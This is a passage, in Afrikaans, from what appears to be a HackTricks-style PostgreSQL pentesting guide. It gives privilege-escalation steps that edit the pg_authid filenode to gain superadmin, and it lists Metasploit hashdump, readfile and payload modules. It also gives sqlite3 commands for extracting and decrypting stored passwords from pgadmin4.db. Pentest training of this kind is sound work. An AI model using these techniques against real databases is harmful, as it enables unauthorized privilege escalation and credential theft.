3. Laai die filenode af deur die `lo_*` funksies
4. Kry die datatipe, geassosieer met die `pg_authid` tabel
5. Gebruik die [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) om die [filenode te redigeer](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); stel alle `rol*` boolean-vlaggies op 1 vir volle regte.
6. Herlaai die geredigeerde filenode via die `lo_*` funksies, en oor skryf die oorspronklike lêer op die skyf
7. _(Opsioneel)_ Maak die in-geheue tabelkas skoon deur 'n duur SQL-navraag uit te voer
8. Jy behoort nou die voorregte van 'n volle superadmin te hê.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Binne die _**postgresql.conf**_ lêer kan jy postgresql logs aktiveer deur te verander:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Dan, **herbegin die diens**.

### pgadmin

[pgadmin](https://www.pgadmin.org) is 'n administrasie- en ontwikkelingsplatform vir PostgreSQL.\
Jy kan **wagwoorde** binne die _**pgadmin4.db**_ lêer vind.\
Jy kan dit ontcijfer met die _**decrypt**_ funksie binne die skrif: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Kliëntverifikasie in PostgreSQL word bestuur deur 'n konfigurasie-lêer genaamd **pg_hba.conf**. Hierdie lêer bevat 'n reeks rekords, elk wat 'n verbindingstipe, kliënt IP-adresreeks (indien van toepassing), databasisnaam, gebruikersnaam, en die verifikasiemetode spesifiseer wat gebruik moet word vir ooreenstemmende verbindings. Die eerste rekord wat ooreenstem met die verbindingstipe, kliëntadres, aangevraagde databasis, en gebruikersnaam word gebruik vir verifikasie. Daar is geen terugval of rugsteun as verifikasie misluk nie. As geen rekord ooreenstem nie, word toegang geweier.

Die beskikbare wagwoord-gebaseerde verifikasiemetodes in pg_hba.conf is **md5**, **crypt**, en **password**. Hierdie metodes verskil in hoe die wagwoord oorgedra word: MD5-gehasht, crypt-geënkripteer, of duidelike teks. Dit is belangrik om te noem dat die crypt-metode nie gebruik kan word met wagwoorde wat in pg_authid geënkripteer is nie.

{{#include ../banners/hacktricks-training.md}}
